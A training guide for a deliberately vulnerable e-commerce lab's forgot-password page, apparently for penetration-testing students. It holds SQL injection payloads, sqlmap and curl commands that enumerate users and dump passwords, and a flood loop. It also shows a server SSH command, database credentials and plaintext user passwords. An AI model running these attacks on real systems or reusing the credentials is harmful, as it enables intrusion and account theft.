# Forgot Password Feature - Vulnerability Testing Guide

## 🔓 Feature Overview

**URL:** https://shopease.zevonai.com/forgot-password

The forgot password feature has been intentionally designed with multiple critical vulnerabilities for penetration testing training.

---

## 🐛 Intentional Vulnerabilities

### 1. **SQL Injection (A03: Injection)**

**Location:** Email input field  
**Severity:** CRITICAL  
**OWASP:** A03:2021 – Injection

**Vulnerability Details:**
- The email parameter is directly concatenated into SQL query without sanitization
- No parameterized queries or input validation

**Vulnerable Code:**
```javascript
const query = `SELECT * FROM users WHERE email = '${email}'`;
```

**Exploitation Examples:**

#### Test 1: Basic SQL Injection
```sql
Input: ' OR '1'='1' --
Result: Retrieves first user's password in database
```

#### Test 2: UNION-based SQL Injection
```sql
Input: ' UNION SELECT id, name, email, password, role, phone, address, created_at FROM users WHERE '1'='1
Result: Dumps all user passwords
```

#### Test 3: Extract Specific User
```sql
Input: admin@shopease.in' OR email='admin@shopease.in' --
Result: Retrieves admin password
```

#### Test 4: Time-based Blind SQLi
```sql
Input: ' OR SLEEP(5) --
Result: 5-second delay confirms vulnerability
```

**Using sqlmap:**
```bash
sqlmap -u "https://shopease.zevonai.com/forgot-password" \
  --data="email=test@test.com" \
  --batch --risk=3 --level=5
```

---

### 2. **Information Disclosure (A01: Broken Access Control)**

**Severity:** CRITICAL  
**OWASP:** A01:2021 – Broken Access Control

**Vulnerability Details:**
- Password is displayed in plain text on the page
- No verification mechanism (email, SMS, security questions)
- Anyone can retrieve any user's password without authentication

**Test Steps:**
1. Go to `/forgot-password`
2. Enter any valid email: `rajesh@gmail.com`
3. Submit form
4. Password is displayed directly on screen: `password123`

**Expected Response:**
```
Your password is: password123

Account Details:
Name: Rajesh Kumar
Email: rajesh@gmail.com
Password: password123
User ID: 2
```

**Impact:**
- Complete account takeover without authentication
- No rate limiting on requests
- No logging of password retrieval attempts

---

### 3. **User Enumeration (A01: Broken Access Control)**

**Severity:** MEDIUM  
**OWASP:** A01:2021 – Broken Access Control

**Vulnerability Details:**
- Different error messages reveal if email exists in database
- Attackers can enumerate valid user accounts

**Test Cases:**

#### Valid Email:
```
Input: admin@shopease.in
Output: "Your password is: admin123"
Status: Email exists, password disclosed
```

#### Invalid Email:
```
Input: nonexistent@test.com
Output: "Email not found in our system"
Status: Reveals email doesn't exist
```

**Exploitation:**
```bash
# Create wordlist
cat > emails.txt << EOF
admin@shopease.in
user1@test.com
rajesh@gmail.com
fake@fake.com
EOF

# Test enumeration
while read email; do
  response=$(curl -s -X POST https://shopease.zevonai.com/forgot-password -d "email=$email")
  if echo "$response" | grep -q "Your password is"; then
    echo "[+] Valid: $email"
  else
    echo "[-] Invalid: $email"
  fi
done < emails.txt
```

---

### 4. **No Rate Limiting (A07: Identification and Authentication Failures)**

**Severity:** HIGH  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Vulnerability Details:**
- Unlimited password retrieval attempts
- No CAPTCHA or anti-automation protection
- No account lockout mechanism

**Exploitation:**
```bash
# Brute force valid emails
for i in {1..1000}; do
  curl -s -X POST https://shopease.zevonai.com/forgot-password \
    -d "email=user$i@gmail.com" &
done
```

---

### 5. **Verbose Error Messages (A05: Security Misconfiguration)**

**Severity:** MEDIUM  
**OWASP:** A05:2021 – Security Misconfiguration

**Vulnerability Details:**
- Database errors are displayed to users
- Stack traces reveal internal system information

**Test:**
```
Input: admin@shopease.in'
Expected Error: Database error: You have an error in your SQL syntax...
```

This reveals:
- Database type (MySQL)
- Query structure
- Table/column names

---

### 6. **Plain Text Password Storage (A02: Cryptographic Failures)**

**Severity:** CRITICAL  
**OWASP:** A02:2021 – Cryptographic Failures

**Vulnerability Details:**
- Passwords stored in plain text in database
- No hashing, salting, or encryption
- Visible in response and database

**Database Check:**
```bash
# SSH to server
ssh -i ~/Downloads/prod.pem ubuntu@184.72.203.30

# Check database
cd ~/shopease
docker compose -f docker-compose.prod.yml exec -T db mysql -u shopease_user -pshopease_pass shopease -e "SELECT email, password FROM users LIMIT 5;"
```

**Result:**
```
email                      | password
---------------------------+------------
admin@shopease.in          | admin123
rajesh@gmail.com           | password123
priya.sharma@yahoo.com     | user1234
```

---

### 7. **No Email Verification (A07: Authentication Failures)**

**Severity:** HIGH  
**OWASP:** A07:2021 – Identification and Authentication Failures

**Vulnerability Details:**
- No verification that requester owns the email
- No confirmation email sent
- Instant password disclosure

**Impact:**
- Attacker can retrieve passwords for any known email
- No audit trail
- Legitimate users won't know their password was accessed

---

## 🧪 Complete Testing Workflow

### Step 1: Manual Testing

1. **Access the feature:**
   ```
   https://shopease.zevonai.com/forgot-password
   ```

2. **Test valid email:**
   - Input: `strawhattemp6@gmail.com`
   - Expected: Password `Temp6@1234` displayed

3. **Test invalid email:**
   - Input: `notexist@fake.com`
   - Expected: "Email not found in our system"

4. **Test SQL injection:**
   - Input: `' OR '1'='1' --`
   - Expected: First user's password revealed

### Step 2: Automated Testing

#### Using Burp Suite:
1. Intercept POST request to `/forgot-password`
2. Send to Repeater
3. Test payloads:
   - `' OR 1=1 --`
   - `' UNION SELECT NULL,NULL,NULL,password,NULL,NULL,NULL,NULL FROM users --`
4. Send to Intruder for enumeration attack

#### Using OWASP ZAP:
1. Spider the application
2. Active scan `/forgot-password`
3. Check for SQL injection findings
4. Manual explore with fuzzing

### Step 3: Password Dump

```bash
# Extract all passwords via SQLi
curl -s -X POST https://shopease.zevonai.com/forgot-password \
  -d "email=' UNION SELECT GROUP_CONCAT(CONCAT(email,':',password) SEPARATOR '\n'),2,3,4,5,6,7,8 FROM users WHERE '1'='1" \
  | grep -oP 'password is: \K.*'
```

---

## 📊 Vulnerability Summary Table

| Vulnerability | OWASP Category | Severity | Exploitability | Impact |
|--------------|----------------|----------|----------------|--------|
| SQL Injection | A03 | CRITICAL | Easy | Complete DB access |
| Information Disclosure | A01 | CRITICAL | Easy | Password exposure |
| User Enumeration | A01 | MEDIUM | Easy | Account discovery |
| No Rate Limiting | A07 | HIGH | Easy | Brute force attacks |
| Verbose Errors | A05 | MEDIUM | Easy | Info leakage |
| Plain Text Passwords | A02 | CRITICAL | N/A | No confidentiality |
| No Email Verification | A07 | HIGH | Easy | Unauthorized access |

---

## 🎯 Learning Objectives

### Students Should Learn:

1. **SQL Injection:**
   - How to identify SQL injection points
   - Crafting payloads for data extraction
   - Using automated tools (sqlmap)
   - Prevention: Parameterized queries

2. **Information Disclosure:**
   - Identifying sensitive data exposure
   - Impact of poor password reset design
   - Prevention: Token-based reset flows

3. **Authentication Flaws:**
   - User enumeration techniques
   - Importance of rate limiting
   - Prevention: Generic error messages

4. **Cryptography:**
   - Dangers of plain text storage
   - Password hashing best practices
   - Prevention: bcrypt, argon2

---

## 🛡️ Secure Implementation (For Reference)

**What a SECURE forgot password should include:**

1. ✅ **Token-based Reset:**
   - Generate random, time-limited token
   - Send token via email only
   - Require token + new password to reset

2. ✅ **Email Verification:**
   - Confirm user owns the email
   - Don't reveal if email exists
   - Generic success message always

3. ✅ **Rate Limiting:**
   - Max 3-5 attempts per hour
   - CAPTCHA after failed attempts
   - IP-based throttling

4. ✅ **Secure Storage:**
   - Hash passwords (bcrypt, argon2)
   - Salt each password
   - Never log or display passwords

5. ✅ **Input Validation:**
   - Parameterized SQL queries
   - Email format validation
   - Escape all user input

6. ✅ **Logging & Monitoring:**
   - Log all reset attempts
   - Alert on suspicious patterns
   - Notify user of reset requests

---

## 📝 Assessment Criteria

### Students should be able to:

- [ ] Identify SQL injection vulnerability
- [ ] Extract at least 3 user passwords via SQLi
- [ ] Demonstrate user enumeration attack
- [ ] Explain why information disclosure is critical
- [ ] Use automated tools (Burp Suite/sqlmap)
- [ ] Document all findings in a report
- [ ] Provide remediation recommendations
- [ ] Explain impact on business/users

---

## 🔗 Related Vulnerabilities

This feature connects to other vulnerabilities in the system:

1. **Login Page:** SQL injection with same technique
2. **Admin Panel:** Retrieved admin password grants access
3. **Database:** Direct access via SQLi to all tables
4. **Session Management:** Weak session after login
5. **IDOR:** Use retrieved credentials to access other users' data

---

## 📚 References

- **OWASP Top 10 2021:** https://owasp.org/Top10/
- **OWASP Authentication Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- **SQL Injection Prevention:** https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- **Password Storage Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html

---

## ✅ Testing Checklist

**Instructor Use:**

- [ ] Verify forgot password page loads
- [ ] Test valid email retrieves password
- [ ] Test invalid email shows error
- [ ] Confirm SQL injection works: `' OR '1'='1' --`
- [ ] Verify passwords shown in plain text
- [ ] Test user enumeration attack
- [ ] Confirm no rate limiting (multiple requests)
- [ ] Check database shows plain text passwords
- [ ] Verify error messages disclose SQL syntax
- [ ] Test with Burp Suite/sqlmap
- [ ] Document all findings for student reference

---

**Feature Status:** ✅ DEPLOYED TO PRODUCTION  
**Last Updated:** July 3, 2026  
**URL:** https://shopease.zevonai.com/forgot-password
